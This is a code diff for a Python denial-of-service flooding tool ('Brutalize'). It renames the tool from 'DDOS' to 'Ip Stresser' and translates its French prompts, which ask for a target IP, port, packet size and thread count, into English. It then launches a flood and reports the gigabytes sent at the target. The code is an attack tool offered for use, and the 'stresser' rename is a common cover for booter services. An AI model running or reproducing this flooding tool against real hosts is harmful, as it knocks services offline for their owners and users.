@@ -4,7 +4,7 @@ from threading import Thread
 from random import choices, randint
 from time import time, sleep
 
-TitrePage("DDOS")
+TitrePage("Ip Stresser")
 
 class Brutalize:
     def __init__(self, ip, port, force, threads):
@@ -42,7 +42,7 @@ class Brutalize:
 
             if size != 0:
                 self.total += self.sent * bytediff / gb * interval
-                TitrePage(f"DDOS | {round(size)} Mo/s | Total: {round(self.total, 1)}Go")
+                TitrePage(f"Ip Stresser | {round(size)} Mo/s | Total: {round(self.total, 1)}Go")
                 print(f"{couleur.CYAN}{round(size)} Mo/s{couleur.RED} | Total: {couleur.YELLOW}{round(self.total, 1)}Go", end='\r')
 
             now2 = time()
@@ -75,9 +75,9 @@ class Brutalize:
 
 def main():
     ip = input(f"{couleur.RED}\nIp -> {couleur.RESET}")
-    port = input(f"{couleur.RED}\nPort (entrez pour défaut) -> {couleur.RESET}")
-    force = input(f"{couleur.RED}\nOctets par paquet (entrez pour défaut) -> {couleur.RESET}")
-    threads = input(f"{couleur.RED}\nThreads (entrez pour défaut) -> {couleur.RESET}")
+    port = input(f"{couleur.RED}\nPort (enter default) -> {couleur.RESET}")
+    force = input(f"{couleur.RED}\nOctets Per Packet (enter default) -> {couleur.RESET}")
+    threads = input(f"{couleur.RED}\nThreads (enter default) -> {couleur.RESET}")
 
     if force == '':
         force = 1250
@@ -85,8 +85,7 @@ def main():
         try:
             force = int(force)
         except ValueError:
-            print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Veuillez entrer un nombre !", couleur.RESET)
-            Reset()
+            ErreurNombre()
 
     if threads == '':
         threads = 35
@@ -94,16 +93,15 @@ def main():
         try:
             threads = int(threads)
         except ValueError:
-            print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Veuillez entrer un nombre !", couleur.RESET)
-            Reset()
+            ErreurNombre()
 
-    print(f"\n{couleur.RED}Lancement de l'attaque sur \"{couleur.CYAN}{ip}{couleur.RED}\".{couleur.RESET}")
+    print(f"\n{couleur.RED}Start Attack \"{couleur.CYAN}{ip}{couleur.RED}\".{couleur.RESET}")
     brute = Brutalize(ip, port, force, threads)
     try:
         brute.flood()
     except:
         brute.stop()
-        print(f"\n{couleur.RED}[ERREUR] | {couleur.LIGHTRED_EX}Il y a eu une erreur, l'attaque a été stoppée.", couleur.RESET)
+        print(f"\n{couleur.RED}[ERREUR] | {couleur.LIGHTRED_EX}Attack Stop", couleur.RESET)
         Reset()
 
     try:
@@ -111,7 +109,7 @@ def main():
             sleep(1000000)
     except KeyboardInterrupt:
         brute.stop()
-        print(f"{couleur.RED}L'attaque s'est arrêtée. \"{couleur.CYAN}{ip}{couleur.RED}\" a été frappé avec \"{round(brute.total, 1)}Go\".\n")
+        print(f"{couleur.RED}Attack Stop. \"{couleur.CYAN}{ip}{couleur.RED}\" a was struck by \"{round(brute.total, 1)}Go\".\n")
         Reset()
 
 if __name__ == '__main__':
